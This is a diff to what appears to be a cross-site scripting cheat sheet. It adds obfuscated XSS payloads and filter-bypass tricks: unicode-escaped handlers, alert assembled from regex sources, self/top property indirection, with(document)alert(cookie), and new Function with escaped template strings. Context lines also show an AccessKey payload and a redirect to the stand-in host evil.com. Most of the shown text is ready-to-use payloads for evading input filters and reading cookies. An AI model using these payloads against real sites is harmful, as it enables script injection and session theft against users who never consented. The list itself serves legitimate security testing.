@@ -14,12 +14,13 @@
 Note
 
 - tags - `script, img, svg, svg animate `
-
-- event handlers -  `onerror, onmouseover, onfocus, autofocus onfocus, onbegin`
-
+- event handlers -  `onerror, onmouseover, onfocus, onblur, autofocus onfocus, onbegin `
 - functions -   `prompt, confirm, window.location("https://evil.com"), print`
-
 - if tag is hidden make use of AccessKey payload
+- \u0061 = 'a'
+- \u006c = 'l'
+- /al/.source → 'al' and /ert/.source → 'ert' So /al/.source + /ert/.source → 'alert'
+- top is the top-level window object (same as window in most contexts), top["alert"] is the same as alert
 
 ```
 <script>alert(1)</script>
@@ -47,6 +48,10 @@ Note
 
 <input type="hidden" accesskey="X" onclick="alert(1)">
 
+<h1 onclick=\u0061\u006cert("_Y000!_")>Y00</h1>
+
+<input onblur=top[/al/.source+/ert/.source]("_Y00!_") autofocus><input autofocus>
+
 ```
 #### Javsscript Context
 
@@ -54,9 +59,17 @@ Note
 
 - if ' is ecaped then add \ in the begining of payload,  it will escape the / and payload will be successful.
 - if ' is blocked then use html encoded &apos;
+- if . is blocked then use []
 - if ; are blocked then use {}
 - if () are blocked then use `throw` in javascript (https://esdiscuss.org/topic/hacking-onerror-throw)
 - if the XSS context is into a JavaScript template literal, there is no need to terminate the literal. Instead, you simply need to use the ${...}
+
+- `document['cookie']` is the same as `document.cookie` - In JavaScript, object['property'] and object.property are equivalent for accessing properties
+- `with(document)alert(cookie)` is same as `alert(document.cookie)` - The with(document) statement temporarily changes the scope to the document object. So inside the with block (or expression), unqualified property names are assumed to be properties of document.
+- Execute alert(1) by dynamically creating a function with new Function(...)
+- 'new Function\al\ert\`1\`' `is osfucated version of` Function("alert(1)")()
+- self[`aler`%2b`t`]`1` - self is a reference to the global object in browsers (same as window), so self["alert"] is just alert, Here, %2b is URL encoding for the plus sign (+), so its like `aler`%2b`t` → `aler` + `t` → "aler" + "t" → "alert". So the payload becomes: self["alert"]`1`, This is equivalent to: alert`1`
+
 
 ```
 ";window.location="https://evil.com";//996
@@ -74,6 +87,19 @@ Note
 '; onerror=eval;throw'=alert\x281\x29';' 
 
 ${alert(1)}
+
+alert(document.cookie)
+alert(document['cookie'])
+with(document)alert(cookie)
+
+alert(1)
+Function("alert(1)")()
+(new Function('alert(1)'))()
+'new Function`al\ert\`1\``'
+'new Function`pro\mpt\`1\``'
+
+alert`1`
+self[`aler`%2b`t`]`1`
 
 ```
 
